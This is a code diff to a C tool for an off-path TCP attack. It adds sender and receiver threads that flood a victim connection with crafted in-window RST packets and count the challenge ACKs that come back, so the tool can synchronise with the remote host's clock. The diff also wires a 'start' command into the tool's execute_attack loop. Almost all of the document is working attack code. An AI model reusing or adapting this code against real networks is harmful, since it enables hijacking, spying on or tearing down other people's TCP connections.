@@ -34,6 +34,13 @@
 
 /* terminal interactions */
 #include <termios.h>
+
+/* precise timing */
+#include <sys/time.h>
+
+/* threading */
+#include <pthread.h>
+
 #include "router.h"
 
 
@@ -61,6 +68,14 @@ typedef struct conn_struct {
 	u_long seq;
 	u_long ack;
 } conn_t;
+
+typedef struct thctx_struct {
+	pcap_t *pch;
+	int ipoff;
+	conn_t *conn;
+	void *packet;
+	size_t pktlen;
+} thctx_t;
 
 
 /*
@@ -244,6 +259,205 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2
 
 
 /*
+ * a thread to spam packets =)
+ */
+void *send_thread(void *arg)
+{
+	thctx_t *pctx;
+	struct timeval start, now, diff;
+	int j;
+
+	pctx = (thctx_t *)arg;
+
+	//printf("[*] Sending 200 RSTs...\n");
+	for (j = 0; j < 200; j++) {
+		gettimeofday(&start, NULL);
+
+		pcap_sendpacket(pctx->pch, (void *)pctx->packet, pctx->pktlen);
+
+		do {
+			gettimeofday(&now, NULL);
+			timersub(&now, &start, &diff);
+		} while (diff.tv_usec < 5000);
+		//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
+	}
+	return NULL;
+}
+
+/*
+ * a thread to receive packets =)
+ */
+void *recv_thread(void *arg)
+{
+	thctx_t *pctx;
+	int chack_cnt = 0;
+	struct timeval listen_start, now, diff;
+	struct pcap_pkthdr *pchdr = NULL;
+	const u_char *inbuf = NULL;
+	int pcret;
+	u_char flags;
+	size_t datalen;
+
+	pctx = (thctx_t *)arg;
+
+	/* listen for acks for 2 seconds */
+	//printf("[*] Waiting 2 seconds for challenge ACKs...\n");
+	gettimeofday(&listen_start, NULL);
+	do {
+		pcret = pcap_next_ex(pctx->pch, &pchdr, &inbuf);
+		if (pcret == 1
+			&& tcp_recv(pchdr, pctx->ipoff, inbuf, &flags, NULL, NULL, NULL, &datalen
+#ifdef DEBUG_SEQ
+				, pctx->conn->state
+#endif
+				)
+			&& flags == TH_ACK) {
+			chack_cnt++;
+		}
+
+		gettimeofday(&now, NULL);
+		timersub(&now, &listen_start, &diff);
+		//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
+	} while (diff.tv_sec < 2);
+	//} while (diff.tv_sec < 1 || (diff.tv_sec == 1 && diff.tv_usec < 850000));
+	//} while (diff.tv_sec < 2 || (diff.tv_sec == 2 && diff.tv_usec < 50000));
+	//printf("%lu %lu\n", diff.tv_sec, diff.tv_usec);
+
+	return (void *)chack_cnt;
+}
+
+
+/*
+ * to conduct the attack, we need to synchronize with the remote system's clock
+ *
+ * 1. send 200 in-window RSTs spaced evenly
+ * 2. count the challenge acks returned
+ * 3. adjust accordingly
+ * 4. confirm
+ *
+ * the goal is exactly 100 challenge ACKs received...
+ */
+int sync_time_with_remote(thctx_t *pctx)
+{
+	int chack_cnt[3] = { 0 };
+	int i, round = 0;
+	u_long old_seq;
+	char packet[8192];
+	size_t pktlen = sizeof(packet) - 14;
+	pthread_t sth, rth;
+	struct timeval start, now, diff;
+
+	/* generate the packet we'll send over and over to elicit challenge ACKs */
+	old_seq = pctx->conn->seq;
+	pctx->conn->seq += 5000;
+	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", 14);
+	if (!tcp_craft(packet + 14, &pktlen, pctx->conn, TH_RST, NULL, 0))
+		return 0;
+	pktlen += 14;
+	pctx->conn->seq = old_seq;
+
+	pctx->packet = packet;
+	pctx->pktlen = pktlen;
+
+	while (1) {
+#ifdef DEBUG_SEND_TIME
+		struct timeval send_start;
+#endif
+#ifdef DEBUG_RECV_TIME
+		struct timeval recv_start;
+
+		/* spawn the recv thread first */
+		gettimeofday(&recv_start, NULL);
+#endif
+		if (pthread_create(&rth, NULL, recv_thread, pctx)) {
+			fprintf(stderr, "[!] failed to start recv thread!\n");
+			return 0;
+		}
+
+		/* spawn the send thread */
+#ifdef DEBUG_SEND_TIME
+		gettimeofday(&send_start, NULL);
+#endif
+		if (pthread_create(&sth, NULL, send_thread, pctx)) {
+			fprintf(stderr, "[!] failed to start send thread!\n");
+			pthread_cancel(rth);
+			return 0;
+		}
+
+		/* wait for the send thread to terminate (it should terminate first) */
+		if (pthread_join(sth, NULL)) {
+			fprintf(stderr, "[!] failed to join send thread!\n");
+			pthread_cancel(rth);
+			return 0;
+		}
+#ifdef DEBUG_SEND_TIME
+		gettimeofday(&now, NULL);
+		timersub(&now, &send_start, &diff);
+		printf("send took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* wait for the recv thread to terminate */
+		if (pthread_join(rth, (void **)&chack_cnt[round])) {
+			fprintf(stderr, "[!] failed to join recv thread!\n");
+			return 0;
+		}
+
+		gettimeofday(&start, NULL); /* round finish start time */
+#ifdef DEBUG_RECV_TIME
+		timersub(&start, &recv_start, &diff);
+		printf("recv took %lu %lu\n", diff.tv_sec, diff.tv_usec);
+#endif
+		printf("[*] Round %d - %d challenge acks\n", round + 1, chack_cnt[round]);
+
+		/* did we synch?? */
+		if (chack_cnt[round] == 100)
+			/* woot! */
+			break;
+
+		else if (chack_cnt[round] < 100) {
+			fprintf(stderr, "[!] invalid number of challenge ACKs! starting over...\n");
+			continue;
+		}
+
+		/* woot! */
+		else if (round < 2) {
+			/* round 1 -> round 2 : delay by 5ms */
+			uint64_t delay = 5000;
+
+			if (round == 1) {
+				/* round 2 -> round 3 : delay precisely */
+				if (chack_cnt[round] >= chack_cnt[0]) {
+					delay = (300 - chack_cnt[round]) * 5000;
+					//printf("delaying for %lu us (1)\n", delay);
+				} else {
+					delay = (chack_cnt[round] - 100) * 5000;
+					//printf("delaying for %lu us (2)\n", delay);
+				}
+			}
+
+			/* do the delay! */
+			do {
+				gettimeofday(&now, NULL);
+				timersub(&now, &start, &diff);
+			} while ((uint64_t)diff.tv_usec < delay);
+			round++;
+		} else {
+			/* start over :-/ */
+			fprintf(stderr, "[!] reached round 3 without success, restarting...\n");
+			round = 0;
+		}
+	}
+
+	printf("[*] Time synchronization complete!\n");
+	for (i = 0; i < 3; i++) {
+		printf("    Challenge acks round %d : %d\n", i + 1, chack_cnt[i]);
+	}
+
+	return 1;
+}
+
+
+/*
  * this function does the dirty work.
  *
  * it starts by opening a raw socket and starting to capture packets for the
@@ -255,8 +469,8 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2
  * session as needed.
  *
  * special keys while in the data loop:
- *  control-U         (erase to beginning of line)
- * 	control-[ (Esc)   (closes connection and exits)
+ * control-U         (erase to beginning of line)
+ * control-[ (Esc)   (closes connection and exits)
  */
 int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
 {
@@ -387,9 +601,23 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 				case 0xa: // LF
 				case 0xd: // CR
 					outbuf[outlen++] = '\n';
-					if (!tcp_send(pch, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen))
-						return 1;
-					legit_conn.seq += outlen;
+
+					/* start the attack now! */
+					if (strncmp(outbuf, "start\n", 6) == 0) {
+						thctx_t ctx;
+
+						/* fill in most of the context */
+						ctx.pch = pch;
+						ctx.ipoff = ipoff;
+						ctx.conn = &legit_conn;
+
+						if (!sync_time_with_remote(&ctx))
+							fprintf(stderr, "[!] Failed to sync with reomte clock!\n");
+					} else {
+						if (!tcp_send(pch, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen))
+							return 1;
+						legit_conn.seq += outlen;
+					}
 					outlen = 0;
 					break;
 
